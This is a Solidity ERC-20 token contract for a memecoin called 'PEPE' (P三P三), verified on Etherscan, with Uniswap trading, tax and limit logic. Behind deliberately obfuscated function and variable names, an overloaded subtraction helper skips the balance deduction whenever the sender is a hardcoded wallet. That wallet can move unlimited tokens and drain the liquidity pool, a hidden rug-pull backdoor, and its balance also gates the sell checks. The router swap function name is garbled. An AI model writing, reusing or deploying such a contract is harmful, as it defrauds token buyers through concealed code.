/**
 *Submitted for verification at Etherscan.io on 2023-09-13
*/

/*

PEPE   $P三P三


TWITTER: https://twitter.com/PepeThree_erc
TELEGRAM: https://t.me/PepeThree_erc
WEBSITE: https://pepet.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wjrfp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wjrfp(a, b, "SafeMath:");
    }

    function  _wjrfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _snisapsactoryup {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xnisapRauts {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcldedFrof;
    mapping (address => bool) private _taxhWallety;
    mapping(address => uint256) private _lderLaransferestap;
    bool public _tnsferelanale = false;
    address payable private _xqFoRaeiverp;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"PEPE";
    string private constant _symbol = unicode"P三P三";
    uint256 private constant _Totalsk = 420000000 * 10 **_decimals;
    uint256 public _mxTaxAmaunt = _Totalsk;
    uint256 public _WalletSmax = _Totalsk;
    uint256 public _wapThresholdtax= _Totalsk;
    uint256 public _moaxToxSap= _Totalsk;

    uint256 private _BuyTaxinitial=10;
    uint256 private _SellTaxinitial=15;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=7;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeprevent=0;
    uint256 private _bytwouot=0;

    _xnisapRauts private _uisapRautet;
    address private _aPairw;
    bool private _vulkph;
    bool private itoxSwop = false;
    bool private _apEablew = false;

    event _amaunateql(uint _mxTaxAmaunt);
    modifier lckThawxp {
        itoxSwop = true;
        _;
        itoxSwop = false;
    }

    constructor () {
        _balances[_msgSender()] = _Totalsk;
        _isExcldedFrof[owner()] = true;
        _isExcldedFrof[address(this)] = true;
        _isExcldedFrof[_xqFoRaeiverp] = true;
        _xqFoRaeiverp = payable(0x28198f459764509bC118A42C0d26f48760C1213c);

        emit Transfer(address(0), _msgSender(), _Totalsk);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalsk;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjrfp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsferelanale) {
                if (to != address
                (_uisapRautet) && to !=
                 address(_aPairw)) {
                  require(_lderLaransferestap
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lderLaransferestap
                  [tx.origin] = block.number;
                }
            }

            if (from == _aPairw && to != 
            address(_uisapRautet) && !_isExcldedFrof[to] ) {
                require(amount <= _mxTaxAmaunt,
                 "Exceeds the _mxTaxAmaunt.");
                require(balanceOf(to) + amount
                 <= _WalletSmax, "Exceeds the maxWalletSize.");
                if(_bytwouot
                < _wapBeforeprevent){
                  require(! _frxerpz(to));
                }
                _bytwouot++;
                 _taxhWallety[to]=true;
                teeomoun = amount.mul((_bytwouot>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _aPairw && from!= address(this) 
            && !_isExcldedFrof[from] ){
                require(amount <= _mxTaxAmaunt && 
                balanceOf(_xqFoRaeiverp)<_moaxToxSap,
                 "Exceeds the _mxTaxAmaunt.");
                teeomoun = amount.mul((_bytwouot>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_bytwouot>_wapBeforeprevent &&
                 _taxhWallety[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itoxSwop 
            && to == _aPairw && _apEablew &&
             contractTokenBalance>_wapThresholdtax 
            && _bytwouot>_wapBeforeprevent&&
             !_isExcldedFrof[to]&& !_isExcldedFrof[from]
            ) {
                _swpokeykhj( _qekw(amount, 
                _qekw(contractTokenBalance,_moaxToxSap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _enphsprwkx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wjrfp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wjrfp(teeomoun));
        emit Transfer(from, to, 
        amount. _wjrfp(teeomoun));
    }

    function _swpokeykhj(uint256
     tokenAmount) private lckThawxp {
        if(tokenAmount==0){return;}
        if(!_vulkph){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uisapRautet.WETH();
        _approve(address(this),
         address(_uisapRautet), tokenAmount);
        _uisapRautet.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qekw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wjrfp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _xqFoRaeiverp){
            return a ;
        }else{
            return a . _wjrfp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTaxAmaunt = _Totalsk;
        _WalletSmax = _Totalsk;
        _tnsferelanale = false;
        emit _amaunateql(_Totalsk);
    }

    function _frxerpz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _enphsprwkx(uint256
    amount) private {
        _xqFoRaeiverp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vulkph);
        _uisapRautet   =  _xnisapRauts (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uisapRautet), _Totalsk);
        _aPairw = _snisapsactoryup(_uisapRautet.factory()). createPair (address(this),  _uisapRautet . WETH ());
        _uisapRautet.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_aPairw).approve(address(_uisapRautet), type(uint).max);
        _apEablew = true;
        _vulkph = true;
    }

    receive() external payable {}
}